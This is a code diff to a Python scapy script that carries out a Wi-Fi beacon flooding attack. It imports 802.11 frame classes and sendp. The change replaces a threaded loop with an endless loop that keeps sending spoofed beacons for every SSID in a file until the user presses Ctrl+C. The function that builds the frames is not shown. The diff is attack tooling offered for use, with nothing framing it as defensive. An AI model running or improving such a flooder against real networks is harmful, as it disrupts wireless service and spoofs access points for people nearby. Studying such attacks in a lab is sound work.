@@ -1,4 +1,5 @@
 import sys
+import time
 import threading
 from randmac import RandMac
 from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump
@@ -24,8 +25,15 @@ if __name__=='__main__':
     print("[*] Starting Beacon Flooding Attack!")
 
     iface = args[1]
-    
-    with open(args[2]) as file:
-        for line in file:
-            t = threading.Thread(target=main(iface, line.strip()))
-            t.start()
+
+    try:
+        while True:
+            with open(args[2]) as file:
+                for line in file:
+                    main(iface, line.strip())
+            print('To stop the program, press Ctrl+C now.')
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print('Stop Beacon Flooding Attack!')
+        sys.exit()
